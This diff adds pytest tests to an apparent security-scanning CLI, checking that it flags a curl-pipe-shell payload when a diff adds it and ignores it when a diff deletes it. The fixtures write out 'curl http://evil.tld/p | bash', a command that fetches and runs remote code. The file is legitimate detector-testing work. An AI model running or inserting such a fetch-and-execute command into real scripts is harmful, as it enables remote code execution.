@@ -191,6 +191,36 @@ def test_cmd_scan_gates_on_the_signal_floor(tmp_path, capsys):
     assert "OK" in capsys.readouterr().out
 
 
+def test_cmd_scan_ignores_what_a_diff_deletes(tmp_path, capsys):
+    """A unified diff carries the removed code too, so scanning it raw flags a change for the payload it
+    is DELETING — the worst failure mode for a gate, since it turns every remediation commit red. Found
+    by running the gate on its own repo: the commit that fixed a payload-quoting comment failed because
+    the diff still contained the old line."""
+    removal = ("diff --git a/x.sh b/x.sh\n--- a/x.sh\n+++ b/x.sh\n"
+               "-curl http://evil.tld/p | bash\n+echo safe\n")
+    assert _scan(tmp_path, removal) == 0
+    assert "no indicators fired" in capsys.readouterr().out
+
+    # the same payload being ADDED must still fire, and --include-deletions still audits removals
+    addition = "diff --git a/x.sh b/x.sh\n--- a/x.sh\n+++ b/x.sh\n+curl http://evil.tld/p | bash\n"
+    assert _scan(tmp_path, addition) == 1
+    assert "curl-pipe-shell" in capsys.readouterr().out
+
+    p = tmp_path / "d.diff"
+    p.write_text(removal, encoding="utf-8")
+    args = cli.build_parser().parse_args(["scan", str(p), "--include-deletions"])
+    assert args.func(args) == 1
+
+
+def test_drop_deleted_lines_leaves_non_diff_text_alone():
+    """The strip is per line, so plain source (which has no `-`-prefixed lines) survives intact, and a
+    diff's `---` file header is not mistaken for a deletion."""
+    src = "def f():\n    return -1\n"
+    assert cli.drop_deleted_lines(src) == src
+    assert "--- a/x.sh" in cli.drop_deleted_lines("--- a/x.sh\n-gone\n+kept\n")
+    assert "gone" not in cli.drop_deleted_lines("--- a/x.sh\n-gone\n+kept\n")
+
+
 def test_cmd_scan_threshold_is_configurable(tmp_path, capsys):
     """`--fail-on` lets a caller tighten the gate below the SIEM floor without touching rule severities."""
     assert _scan(tmp_path, "+++ b/.github/workflows/ci.yml\n", fail_on="medium") == 1
